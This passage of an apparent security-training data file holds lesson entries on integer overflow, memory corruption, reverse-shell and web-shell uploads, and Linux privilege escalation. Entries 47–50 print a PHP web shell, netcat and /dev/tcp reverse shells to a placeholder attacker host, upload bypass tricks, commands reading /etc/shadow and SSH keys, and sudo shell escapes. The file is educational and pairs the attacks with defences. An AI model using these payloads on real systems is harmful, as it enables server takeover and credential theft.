        <p><b>Race Condition:</b> Exploits timing windows between concurrent operations.</p>

        <p><b>Logic Bug:</b> Exploits flawed application business logic regardless of timing.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may duplicate transactions, bypass restrictions, escalate privileges, abuse financial systems, manipulate resources, or compromise critical application functionality.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Race Condition vulnerabilities are considered highly critical because improper synchronization may expose core application logic and security protections to abuse.</p>
    `
},


{
    "id": 45,
    "title": "Integer Overflow Vulnerability",
    "summary": `
        <p><b>Integer Overflow</b> is a dangerous vulnerability that occurs when arithmetic operations produce values larger or smaller than the storage capacity of an integer variable.</p>

        <p>This vulnerability may allow attackers to bypass security checks, corrupt memory, trigger unexpected behavior, or achieve arbitrary code execution in vulnerable applications.</p>

        <h3>What is an Integer?</h3>

        <p>An integer is a numeric data type used to store whole numbers in computer memory.</p>

        <h3>Basic Integer Sizes:</h3>

        <pre><code>8-bit
16-bit
32-bit
64-bit</code></pre>

        <p>Each integer type has a limited storage range.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications fail to validate arithmetic operations properly before storing results inside fixed-size integer variables.</p>

        <h3>Basic Overflow Example:</h3>

        <pre><code>unsigned char x = 255;

x = x + 1;</code></pre>

        <p>The value exceeds the maximum size and wraps around unexpectedly.</p>

        <h3>Overflow Result:</h3>

        <pre><code>x = 0</code></pre>

        <p>The integer wraps back to zero because the storage limit is exceeded.</p>

        <h3>Why is Integer Overflow Dangerous?</h3>

        <p>Successful exploitation may bypass validation logic, trigger memory corruption, allocate incorrect memory sizes, or compromise application security.</p>

        <h3>Signed vs Unsigned Integers:</h3>

        <pre><code>signed int
unsigned int</code></pre>

        <p>Signed integers allow negative values while unsigned integers only store positive values.</p>

        <h3>Signed Integer Overflow Example:</h3>

        <pre><code>int x = 2147483647;

x = x + 1;</code></pre>

        <p>The value exceeds the maximum 32-bit signed integer limit.</p>

        <h3>Memory Allocation Vulnerability:</h3>

        <pre><code>size = count * sizeof(item);

malloc(size);</code></pre>

        <p>Overflow during size calculation may allocate insufficient memory.</p>

        <h3>Buffer Overflow Chain:</h3>

        <p>Integer overflows may lead to memory corruption vulnerabilities such as buffer overflows.</p>

        <h3>Authentication Bypass Example:</h3>

        <pre><code>if(balance + deposit &lt; limit)</code></pre>

        <p>Overflow conditions may bypass financial or security restrictions.</p>

        <h3>Loop Overflow Example:</h3>

        <pre><code>for(i=0; i&lt;=max; i++)</code></pre>

        <p>Incorrect integer handling may create infinite loops or logic errors.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Memory corruption.</p>
        <p>2. Authentication bypass.</p>
        <p>3. Arbitrary code execution.</p>
        <p>4. Denial of Service.</p>
        <p>5. Application logic manipulation.</p>

        <h3>Underflow Example:</h3>

        <pre><code>unsigned int x = 0;

x = x - 1;</code></pre>

        <p>The value wraps around to the maximum integer value.</p>

        <h3>Integer Underflow Result:</h3>

        <pre><code>x = 4294967295</code></pre>

        <p>Unsigned integers may wrap into extremely large values.</p>

        <h3>Example Using C:</h3>

        <pre><code>int size = userInput * 1024;</code></pre>

        <p>Attackers may supply large values that trigger overflow conditions.</p>

        <h3>Indicators of Integer Overflow Vulnerabilities:</h3>

        <p>1. Unexpected negative values.</p>
        <p>2. Application crashes.</p>
        <p>3. Incorrect memory allocation.</p>
        <p>4. Arithmetic anomalies.</p>
        <p>5. Unexpected loop behavior.</p>

        <h3>Common Vulnerable Applications:</h3>

        <pre><code>Low-level C programs

Image parsers

File processing software

Embedded systems

Network services</code></pre>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

size = userInput * itemSize;</code></pre>

        <p>The application performs arithmetic without overflow validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Validate ranges

Check arithmetic boundaries

Use safe integer handling</code></pre>

        <p>The application verifies arithmetic operations before processing values.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>Integer sanitizers
Compiler protections
Safe integer libraries</code></pre>

        <p>Modern development tools help detect arithmetic vulnerabilities.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate integer ranges strictly.</b></p>

        <p><b>2. Check arithmetic boundaries before operations.</b></p>

        <p><b>3. Use safe integer handling libraries.</b></p>

        <p><b>4. Enable compiler overflow protections.</b></p>

        <p><b>5. Avoid unsafe type conversions.</b></p>

        <p><b>6. Monitor arithmetic anomalies.</b></p>

        <p><b>7. Perform continuous security testing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable compiler sanitizers

Use secure coding standards

Apply memory protections

Restrict unsafe arithmetic

Perform code auditing</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>AddressSanitizer
UBSan
Valgrind
GDB
Clang Sanitizers</code></pre>

        <h3>Difference Between Integer Overflow and Buffer Overflow:</h3>

        <p><b>Integer Overflow:</b> Corrupts arithmetic logic and numeric calculations.</p>

        <p><b>Buffer Overflow:</b> Corrupts memory boundaries directly.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may trigger memory corruption, bypass security checks, crash applications, manipulate logic calculations, or chain vulnerabilities into arbitrary code execution attacks.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Integer Overflow vulnerabilities are considered highly critical because unsafe arithmetic operations may directly lead to memory corruption and application compromise.</p>
    `
},


{
    "id": 46,
    "title": "Memory Corruption Basics",
    "summary": `
        <p><b>Memory Corruption</b> is a critical class of vulnerabilities that occurs when a program improperly accesses, modifies, or manages computer memory.</p>

        <p>These vulnerabilities may allow attackers to crash applications, leak sensitive information, manipulate execution flow, or achieve arbitrary code execution.</p>

        <h3>What is Computer Memory?</h3>

        <p>Computer memory stores data and instructions while programs are running.</p>

        <h3>Main Memory Regions:</h3>

        <pre><code>Stack
Heap
Data Segment
Code Segment</code></pre>

        <p>Applications use different memory regions for different purposes during execution.</p>

        <h3>How Does Memory Corruption Occur?</h3>

        <p>Memory corruption occurs when applications improperly read from or write to memory locations.</p>

        <h3>Common Causes:</h3>

        <pre><code>Buffer Overflow
Use After Free
Double Free
Integer Overflow
Out Of Bounds Access</code></pre>

        <p>Unsafe memory handling operations frequently lead to corruption vulnerabilities.</p>

        <h3>Basic Buffer Overflow Example:</h3>

        <pre><code>char buffer[16];

strcpy(buffer, input);</code></pre>

        <p>Excessive input may overwrite adjacent memory regions.</p>

        <h3>Out Of Bounds Read Example:</h3>

        <pre><code>array[100]</code></pre>

        <p>Accessing memory outside valid boundaries may expose sensitive information.</p>

        <h3>Use After Free Example:</h3>

        <pre><code>free(ptr);

ptr->data</code></pre>

        <p>The application accesses memory after it has already been released.</p>

        <h3>Why is Memory Corruption Dangerous?</h3>

        <p>Successful exploitation may allow attackers to manipulate memory structures, hijack execution flow, bypass protections, or fully compromise systems.</p>

        <h3>Instruction Pointer Corruption:</h3>

        <pre><code>EIP
RIP</code></pre>

        <p>Attackers attempt to control execution pointers stored in memory.</p>

        <h3>Heap Corruption Example:</h3>

        <pre><code>malloc()
free()</code></pre>

        <p>Improper heap memory management may lead to arbitrary code execution.</p>

        <h3>Segmentation Fault Example:</h3>

        <pre><code>Segmentation fault (core dumped)</code></pre>

        <p>Invalid memory access frequently crashes vulnerable applications.</p>

        <h3>Information Disclosure Example:</h3>

        <pre><code>Read uninitialized memory</code></pre>

        <p>Attackers may leak passwords, tokens, or sensitive application data.</p>

        <h3>Remote Code Execution Scenario:</h3>

        <p>Advanced attackers may inject shellcode or manipulate execution flow to run arbitrary commands.</p>

        <h3>Shellcode Concept:</h3>

        <pre><code>\x90\x90\x90</code></pre>

        <p>NOP sleds are commonly used during memory exploitation.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Arbitrary code execution.</p>
        <p>2. Privilege escalation.</p>
        <p>3. Information disclosure.</p>
        <p>4. Denial of Service.</p>
        <p>5. Full system compromise.</p>

        <h3>Memory Safety Problems:</h3>

        <pre><code>Unsafe pointers
Manual memory management
Unchecked input
Improper object handling</code></pre>

        <p>Low-level programming languages are especially vulnerable to memory corruption issues.</p>

        <h3>Common Vulnerable Languages:</h3>

        <pre><code>C
C++
Assembly</code></pre>

        <p>Manual memory management increases the risk of security vulnerabilities.</p>

        <h3>Example Using GDB:</h3>

        <pre><code>gdb vulnerable-program</code></pre>

        <p>Security researchers analyze memory corruption using debuggers.</p>

        <h3>Indicators of Memory Corruption:</h3>

        <p>1. Unexpected crashes.</p>
        <p>2. Segmentation faults.</p>
        <p>3. Corrupted application behavior.</p>
        <p>4. Invalid pointer access.</p>
        <p>5. Memory access violations.</p>

        <h3>Modern Protection Mechanisms:</h3>

        <pre><code>ASLR
DEP
Stack Canaries
NX Bit
Control Flow Integrity</code></pre>

        <p>Modern operating systems implement defenses against memory exploitation.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

strcpy(buffer, input)</code></pre>

        <p>The application performs unsafe memory operations without validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Validate input length

Use memory-safe functions

Apply secure coding standards</code></pre>

        <p>The application protects memory using safe programming practices.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Use memory-safe programming practices.</b></p>

        <p><b>2. Validate all input boundaries strictly.</b></p>

        <p><b>3. Avoid unsafe memory functions.</b></p>

        <p><b>4. Enable compiler security protections.</b></p>

        <p><b>5. Apply modern operating system defenses.</b></p>

        <p><b>6. Monitor crashes and abnormal behavior.</b></p>

        <p><b>7. Perform continuous security auditing.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable ASLR

Use DEP/NX protections

Compile with stack canaries

Restrict executable memory

Apply least privilege execution</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>GDB
Valgrind
AddressSanitizer
Immunity Debugger
Metasploit</code></pre>

        <h3>Difference Between Memory Corruption and Logic Vulnerabilities:</h3>

        <p><b>Memory Corruption:</b> Exploits improper memory access and manipulation.</p>

        <p><b>Logic Vulnerabilities:</b> Exploit flawed business or application logic.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may crash systems, leak sensitive information, hijack execution flow, bypass security mechanisms, escalate privileges, or fully compromise vulnerable applications.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Memory Corruption vulnerabilities are considered extremely critical because direct memory manipulation may lead to arbitrary code execution and complete system compromise.</p>
    `
},


{
    "id": 47,
    "title": "Reverse Shell Upload Attack",
    "summary": `
        <p><b>Reverse Shell Upload Attack</b> is a dangerous exploitation technique where attackers upload malicious server-side scripts that establish remote shell access back to the attacker's machine.</p>

        <p>This attack is commonly associated with insecure file upload vulnerabilities and may lead to full server compromise, Remote Code Execution, or unauthorized system control.</p>

        <h3>What is a Reverse Shell?</h3>

        <p>A reverse shell is a connection initiated from the victim server back to the attacker's system, allowing remote command execution.</p>

        <h3>How Does the Attack Occur?</h3>

        <p>The attack occurs when applications allow unrestricted or improperly validated file uploads containing executable code.</p>

        <h3>Basic Vulnerable Upload Scenario:</h3>

        <pre><code>Upload PHP file to web server</code></pre>

        <p>If uploaded files are executed by the server, attackers may gain code execution.</p>

        <h3>Basic PHP Reverse Shell Example:</h3>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <p>The uploaded script allows attackers to execute system commands remotely.</p>

        <h3>Why is Reverse Shell Upload Dangerous?</h3>

        <p>Successful exploitation may provide attackers with direct remote access to the vulnerable server.</p>

        <h3>Netcat Reverse Shell Example:</h3>

        <pre><code>nc -e /bin/bash attacker-ip 4444</code></pre>

        <p>The server connects back to the attacker's listener.</p>

        <h3>Listener Setup Example:</h3>

        <pre><code>nc -lvnp 4444</code></pre>

        <p>The attacker waits for incoming reverse shell connections.</p>

        <h3>PHP Reverse Shell Payload:</h3>

        <pre><code>&lt;?php
exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/attacker-ip/4444 0&gt;&amp;1'");
?&gt;</code></pre>

        <p>The payload creates an interactive shell connection back to the attacker.</p>

        <h3>Common Upload Targets:</h3>

        <pre><code>.php
.jsp
.asp
.aspx
.cgi</code></pre>

        <p>Attackers upload executable server-side scripts supported by the target server.</p>

        <h3>Extension Bypass Example:</h3>

        <pre><code>shell.php.jpg</code></pre>

        <p>Weak validation mechanisms may allow disguised executable files.</p>

        <h3>MIME Type Bypass:</h3>

        <pre><code>Content-Type: image/jpeg</code></pre>

        <p>Attackers spoof upload headers to bypass file restrictions.</p>

        <h3>Double Extension Example:</h3>

        <pre><code>shell.php.png</code></pre>

        <p>Improper extension filtering may execute uploaded scripts.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote shell access.</p>
        <p>2. Server compromise.</p>
        <p>3. Privilege escalation.</p>
        <p>4. Data theft.</p>
        <p>5. Persistence installation.</p>

        <h3>Linux Command Execution Example:</h3>

        <pre><code>whoami
id
uname -a</code></pre>

        <p>Attackers enumerate system information after gaining shell access.</p>

        <h3>Web Shell vs Reverse Shell:</h3>

        <p><b>Web Shell:</b> Executes commands through HTTP requests.</p>

        <p><b>Reverse Shell:</b> Creates an outbound interactive shell connection.</p>

        <h3>Indicators of Reverse Shell Upload Attacks:</h3>

        <p>1. Suspicious uploaded executable files.</p>
        <p>2. Unexpected outbound network connections.</p>
        <p>3. Strange server processes.</p>
        <p>4. Unusual file upload activity.</p>
        <p>5. Remote command execution behavior.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Image upload systems

Profile picture uploads

Document management portals

CMS platforms

File sharing systems</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /upload HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The attacker uploads malicious executable payloads through vulnerable file upload endpoints.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

Move uploaded file directly to web directory</code></pre>

        <p>The application stores attacker-controlled files without proper validation.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Validate extensions

Store uploads outside web root

Block script execution</code></pre>

        <p>The application prevents uploaded files from executing as server-side code.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Validate file extensions strictly.</b></p>

        <p><b>2. Validate MIME types securely.</b></p>

        <p><b>3. Store uploads outside executable directories.</b></p>

        <p><b>4. Disable script execution inside upload folders.</b></p>

        <p><b>5. Rename uploaded files safely.</b></p>

        <p><b>6. Apply antivirus and malware scanning.</b></p>

        <p><b>7. Monitor suspicious outbound connections.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Disable dangerous functions

Restrict upload permissions

Apply least privilege execution

Use WAF protections

Enable security monitoring</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
Netcat
Wireshark</code></pre>

        <h3>Difference Between Reverse Shell and Bind Shell:</h3>

        <p><b>Reverse Shell:</b> The victim server connects back to the attacker.</p>

        <p><b>Bind Shell:</b> The victim server opens a listening port for attackers.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may gain full remote control over servers, execute arbitrary commands, steal sensitive data, escalate privileges, deploy malware, or pivot deeper into internal networks.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Reverse Shell Upload attacks are considered extremely critical because unrestricted file upload combined with code execution may directly lead to complete server compromise.</p>
    `
},


{
    "id": 48,
    "title": "Web Shell Upload Vulnerability",
    "summary": `
        <p><b>Web Shell Upload Vulnerability</b> is a critical security issue that occurs when attackers upload malicious server-side scripts to vulnerable web applications.</p>

        <p>This vulnerability may allow attackers to execute system commands, manage files, steal sensitive data, establish persistence, or fully compromise the affected server.</p>

        <h3>What is a Web Shell?</h3>

        <p>A web shell is a malicious script uploaded to a web server that provides attackers with remote control through HTTP requests.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when applications improperly validate uploaded files and allow executable scripts to be stored inside accessible web directories.</p>

        <h3>Basic Vulnerable Upload Scenario:</h3>

        <pre><code>Upload executable file into web-accessible directory</code></pre>

        <p>If the server executes uploaded files, attackers may gain Remote Code Execution.</p>

        <h3>Basic PHP Web Shell Example:</h3>

        <pre><code>&lt;?php
system($_GET['cmd']);
?&gt;</code></pre>

        <p>The uploaded shell allows attackers to run operating system commands remotely.</p>

        <h3>Why are Web Shells Dangerous?</h3>

        <p>Successful exploitation may provide persistent remote access to the compromised server.</p>

        <h3>Command Execution Example:</h3>

        <pre><code>http://target.com/shell.php?cmd=whoami</code></pre>

        <p>The attacker executes commands directly through HTTP parameters.</p>

        <h3>Common Web Shell Extensions:</h3>

        <pre><code>.php
.asp
.aspx
.jsp
.cgi</code></pre>

        <p>Attackers upload executable scripts supported by the target server environment.</p>

        <h3>File Upload Bypass Example:</h3>

        <pre><code>shell.php.jpg</code></pre>

        <p>Weak extension filtering may allow disguised malicious files.</p>

        <h3>MIME Type Spoofing:</h3>

        <pre><code>Content-Type: image/png</code></pre>

        <p>Attackers spoof upload content types to bypass validation mechanisms.</p>

        <h3>Double Extension Example:</h3>

        <pre><code>shell.php.png</code></pre>

        <p>Improper extension validation may execute disguised scripts.</p>

        <h3>Popular Web Shell Families:</h3>

        <pre><code>c99
r57
China Chopper
WSO Shell</code></pre>

        <p>Advanced web shells provide complete server management capabilities.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Remote command execution.</p>
        <p>2. File management.</p>
        <p>3. Privilege escalation.</p>
        <p>4. Persistence establishment.</p>
        <p>5. Data exfiltration.</p>

        <h3>Directory Enumeration Example:</h3>

        <pre><code>ls -la
dir</code></pre>

        <p>Attackers enumerate server files after gaining shell access.</p>

        <h3>Credential Theft Example:</h3>

        <pre><code>cat config.php</code></pre>

        <p>Configuration files may expose database credentials and secrets.</p>

        <h3>Remote Access Persistence:</h3>

        <p>Attackers often leave hidden web shells to maintain long-term access.</p>

        <h3>Indicators of Web Shell Upload Attacks:</h3>

        <p>1. Suspicious executable uploads.</p>
        <p>2. Unknown server-side scripts.</p>
        <p>3. Unexpected command execution.</p>
        <p>4. Abnormal outbound traffic.</p>
        <p>5. Strange web requests.</p>

        <h3>Common Vulnerable Features:</h3>

        <pre><code>Profile image uploads

CMS file managers

Document upload systems

Support ticket attachments

File sharing portals</code></pre>

        <h3>Example Using Burp Suite:</h3>

        <pre><code>POST /upload HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <p>The attacker uploads malicious server-side payloads through vulnerable upload endpoints.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

Move uploaded file directly into web root</code></pre>

        <p>The application stores user-controlled files inside executable directories.</p>

        <h3>Safe Backend Example:</h3>

        <pre><code>// Secure Example

Validate file types

Rename uploaded files

Disable script execution</code></pre>

        <p>The application securely handles uploaded content and prevents execution.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Strictly validate file extensions.</b></p>

        <p><b>2. Verify MIME types securely.</b></p>

        <p><b>3. Store uploads outside web-accessible directories.</b></p>

        <p><b>4. Disable script execution inside upload folders.</b></p>

        <p><b>5. Rename uploaded files using random names.</b></p>

        <p><b>6. Use antivirus and malware scanning solutions.</b></p>

        <p><b>7. Monitor suspicious upload activity continuously.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Disable dangerous scripting functions

Restrict file execution permissions

Use WAF protections

Enable upload monitoring

Apply least privilege permissions</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>Burp Suite
OWASP ZAP
Nuclei
YARA
ClamAV</code></pre>

        <h3>Difference Between Web Shell and Reverse Shell:</h3>

        <p><b>Web Shell:</b> Commands execute through web requests over HTTP.</p>

        <p><b>Reverse Shell:</b> The server connects back to the attacker's machine interactively.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may fully compromise web servers, steal sensitive information, execute arbitrary commands, deploy malware, establish persistence, or pivot deeper into internal infrastructure.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Web Shell Upload vulnerabilities are considered extremely critical because unrestricted executable uploads may directly lead to complete server compromise and persistent remote access.</p>
    `
},


{
    "id": 49,
    "title": "Linux Privilege Escalation",
    "summary": `
        <p><b>Linux Privilege Escalation</b> is a post-exploitation attack technique where attackers gain higher permissions on a Linux system after obtaining initial low-level access.</p>

        <p>This attack may allow attackers to become root users, bypass system restrictions, access sensitive files, control services, or fully compromise the operating system.</p>

        <h3>What is Privilege Escalation?</h3>

        <p>Privilege escalation occurs when attackers abuse misconfigurations, vulnerable software, or weak permissions to gain elevated access.</p>

        <h3>Why is Linux Privilege Escalation Dangerous?</h3>

        <p>Successful exploitation may provide complete administrative control over the target system.</p>

        <h3>Common Initial Access Sources:</h3>

        <pre><code>Web shell
SSH compromise
Weak passwords
Remote Code Execution
File upload vulnerabilities</code></pre>

        <p>Attackers first obtain limited user access before escalating privileges.</p>

        <h3>Checking Current User:</h3>

        <pre><code>whoami
id</code></pre>

        <p>Attackers identify current permissions and group memberships.</p>

        <h3>Sudo Misconfiguration:</h3>

        <pre><code>sudo -l</code></pre>

        <p>Misconfigured sudo permissions may allow execution of privileged commands.</p>

        <h3>Dangerous Sudo Example:</h3>

        <pre><code>(ALL) NOPASSWD: ALL</code></pre>

        <p>Improper sudo rules may grant unrestricted root access.</p>

        <h3>SUID Binary Exploitation:</h3>

        <pre><code>find / -perm -4000 2&gt;/dev/null</code></pre>

        <p>SUID binaries execute with elevated privileges and may contain exploitable weaknesses.</p>

        <h3>Writable File Exploitation:</h3>

        <pre><code>find / -writable 2&gt;/dev/null</code></pre>

        <p>World-writable files may allow attackers to modify critical configurations.</p>

        <h3>PATH Hijacking:</h3>

        <pre><code>export PATH=.</code></pre>

        <p>Improper PATH handling may execute attacker-controlled binaries.</p>

        <h3>Cron Job Exploitation:</h3>

        <pre><code>cat /etc/crontab</code></pre>

        <p>Writable cron scripts may execute malicious commands as root.</p>

        <h3>Kernel Exploitation:</h3>

        <pre><code>uname -a</code></pre>

        <p>Outdated kernels may contain Local Privilege Escalation vulnerabilities.</p>

        <h3>Password File Enumeration:</h3>

        <pre><code>cat /etc/passwd</code></pre>

        <p>Attackers inspect local user accounts and configurations.</p>

        <h3>Shadow File Access:</h3>

        <pre><code>cat /etc/shadow</code></pre>

        <p>Improper permissions may expose password hashes.</p>

        <h3>Capabilities Abuse:</h3>

        <pre><code>getcap -r / 2&gt;/dev/null</code></pre>

        <p>Linux capabilities may unintentionally grant elevated privileges.</p>

        <h3>Docker Group Abuse:</h3>

        <pre><code>groups</code></pre>

        <p>Membership in the docker group may provide root-equivalent access.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Root access.</p>
        <p>2. Sensitive file access.</p>
        <p>3. Persistence installation.</p>
        <p>4. Credential theft.</p>
        <p>5. Full server compromise.</p>

        <h3>SSH Key Theft Example:</h3>

        <pre><code>cat ~/.ssh/id_rsa</code></pre>

        <p>Attackers may steal SSH keys for persistent remote access.</p>

        <h3>Environment Variable Abuse:</h3>

        <pre><code>LD_PRELOAD</code></pre>

        <p>Improper environment handling may allow code injection.</p>

        <h3>Indicators of Privilege Escalation Attempts:</h3>

        <p>1. Suspicious sudo usage.</p>
        <p>2. Unauthorized file modifications.</p>
        <p>3. Unexpected cron jobs.</p>
        <p>4. Strange process execution.</p>
        <p>5. Unusual privilege changes.</p>

        <h3>Common Vulnerable Configurations:</h3>

        <pre><code>Weak sudo policies

Misconfigured SUID binaries

Writable system files

Outdated kernels

Insecure cron jobs</code></pre>

        <h3>Example Enumeration Commands:</h3>

        <pre><code>linpeas.sh
sudo -l
find / -perm -4000</code></pre>

        <p>Attackers perform system enumeration to identify escalation vectors.</p>

        <h3>Unsafe System Configuration:</h3>

        <pre><code>// Vulnerable Example

User can run all commands with sudo</code></pre>

        <p>Improper privilege separation exposes the entire system.</p>

        <h3>Secure Configuration Example:</h3>

        <pre><code>// Secure Example

Apply least privilege

Restrict sudo access

Audit SUID binaries</code></pre>

        <p>The system limits unnecessary administrative permissions.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Apply least privilege principles.</b></p>

        <p><b>2. Restrict sudo permissions carefully.</b></p>

        <p><b>3. Audit SUID and SGID binaries regularly.</b></p>

        <p><b>4. Patch kernels and software continuously.</b></p>

        <p><b>5. Secure cron jobs and scheduled tasks.</b></p>

        <p><b>6. Monitor privilege changes actively.</b></p>

        <p><b>7. Restrict writable system files.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable audit logging

Apply kernel hardening

Restrict dangerous capabilities

Use AppArmor or SELinux

Monitor authentication events</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>LinPEAS
Linux Exploit Suggester
pspy
Lynis
Chkrootkit</code></pre>

        <h3>Difference Between Privilege Escalation and Remote Code Execution:</h3>

        <p><b>Privilege Escalation:</b> Increases permissions after gaining initial access.</p>

        <p><b>Remote Code Execution:</b> Allows attackers to execute code remotely initially.</p>

        <h3>Real Attack Impact:</h3>

        <p>Attackers may gain root privileges, steal credentials, disable security controls, deploy persistence mechanisms, manipulate services, or fully compromise Linux servers.</p>

        <h3>Vulnerability Severity:</h3>

        <p>Linux Privilege Escalation vulnerabilities are considered extremely critical because successful exploitation may provide complete administrative control over operating systems.</p>
    `
},


{
    "id": 50,
    "title": "Linux Sudo Misconfiguration",
    "summary": `
        <p><b>Linux Sudo Misconfiguration</b> is a dangerous privilege escalation vulnerability that occurs when sudo permissions are improperly configured, allowing users to execute commands with elevated privileges.</p>

        <p>This vulnerability may allow attackers to gain root access, bypass restrictions, execute arbitrary commands, or fully compromise Linux systems.</p>

        <h3>What is Sudo?</h3>

        <p><code>sudo</code> is a Linux utility that allows authorized users to execute commands as another user, usually the root user.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when administrators grant excessive or insecure sudo permissions without proper restrictions.</p>

        <h3>Checking Sudo Permissions:</h3>

        <pre><code>sudo -l</code></pre>

        <p>This command displays commands the current user is allowed to run with elevated privileges.</p>

        <h3>Dangerous Sudo Rule Example:</h3>

        <pre><code>(ALL) NOPASSWD: ALL</code></pre>

        <p>This configuration allows unrestricted root command execution without requiring a password.</p>

        <h3>Why is Sudo Misconfiguration Dangerous?</h3>

        <p>Successful exploitation may provide attackers with complete root-level access to the system.</p>

        <h3>Shell Escape via Vim:</h3>

        <pre><code>sudo vim

:set shell=/bin/bash
:shell</code></pre>

        <p>Attackers may escape into a root shell using interactive applications.</p>

        <h3>Shell Escape via Less:</h3>

        <pre><code>sudo less /etc/profile

!/bin/bash</code></pre>

        <p>Certain programs allow command execution directly from interactive mode.</p>

        <h3>Shell Escape via Python:</h3>

        <pre><code>sudo python3 -c 'import os; os.system("/bin/bash")'</code></pre>

        <p>Python execution permissions may directly lead to root shell access.</p>

        <h3>Shell Escape via Find:</h3>

        <pre><code>sudo find . -exec /bin/bash \\; -quit</code></pre>

        <p>Attackers abuse executable functions inside allowed binaries.</p>

        <h3>GTFOBins Abuse:</h3>

        <pre><code>https://gtfobins.github.io/</code></pre>

        <p>GTFOBins documents Linux binaries that can be abused for privilege escalation.</p>

        <h3>Wildcard Abuse Example:</h3>

        <pre><code>sudo tar *</code></pre>

        <p>Improper wildcard handling may allow command injection during execution.</p>

        <h3>Environment Variable Abuse:</h3>

        <pre><code>LD_PRELOAD</code></pre>

        <p>Improper environment restrictions may allow malicious library injection.</p>

        <h3>Common Exploitation Goals:</h3>

        <p>1. Root shell access.</p>
        <p>2. Command execution.</p>
        <p>3. Credential theft.</p>
        <p>4. Persistence installation.</p>
        <p>5. Full server compromise.</p>

        <h3>Sudoers File Location:</h3>

        <pre><code>/etc/sudoers</code></pre>

        <p>Improper entries inside the sudoers configuration may expose the system.</p>

        <h3>Unsafe Sudo Configuration Example:</h3>

        <pre><code>user ALL=(ALL) NOPASSWD:/usr/bin/vim</code></pre>

        <p>Interactive applications often provide shell escape functionality.</p>

        <h3>Privilege Escalation via Nmap:</h3>

        <pre><code>sudo nmap --interactive</code></pre>

        <p>Older versions of Nmap may provide interactive shell execution.</p>

        <h3>Indicators of Sudo Misconfiguration:</h3>

        <p>1. Excessive sudo permissions.</p>
        <p>2. NOPASSWD rules.</p>
        <p>3. Interactive binaries allowed via sudo.</p>
        <p>4. Weak command restrictions.</p>
        <p>5. Unsafe environment variable handling.</p>

        <h3>Common Vulnerable Programs:</h3>

        <pre><code>vim
less
find
python
perl
tar</code></pre>

        <p>Many legitimate binaries contain functionality useful for shell escapes.</p>

        <h3>Example Enumeration Commands:</h3>

        <pre><code>sudo -l
cat /etc/sudoers
groups</code></pre>

        <p>Attackers enumerate sudo privileges and user permissions.</p>

        <h3>Unsafe Backend Example:</h3>

        <pre><code>// Vulnerable Example

Allow unrestricted sudo execution</code></pre>

        <p>The system grants excessive administrative permissions to low-privileged users.</p>

        <h3>Secure Configuration Example:</h3>

        <pre><code>// Secure Example

Restrict sudo commands

Avoid interactive binaries

Require passwords</code></pre>

        <p>The system applies strict privilege separation and command restrictions.</p>

        <h3>Secure Protection Methods:</h3>

        <p><b>1. Apply least privilege principles.</b></p>

        <p><b>2. Restrict sudo access carefully.</b></p>

        <p><b>3. Avoid allowing interactive programs through sudo.</b></p>

        <p><b>4. Remove unnecessary NOPASSWD rules.</b></p>

        <p><b>5. Restrict dangerous environment variables.</b></p>

        <p><b>6. Audit sudo configurations regularly.</b></p>

        <p><b>7. Monitor suspicious privilege escalation activity.</b></p>

        <h3>Server Hardening Techniques:</h3>

        <pre><code>Enable audit logging

Restrict administrative groups

Use AppArmor or SELinux

Apply command whitelisting

Monitor sudo events</code></pre>

        <h3>Detection Tools:</h3>

        <pre><code>LinPEAS
GTFOBins
Lynis
pspy
Linux Exploit Suggester</code></pre>

        <h3>Difference Between Sudo Misconfiguration and Kernel Exploits:</h3>

        <p><b>Sudo Misconfiguration:</b> Exploits insecure privilege settings.</p>

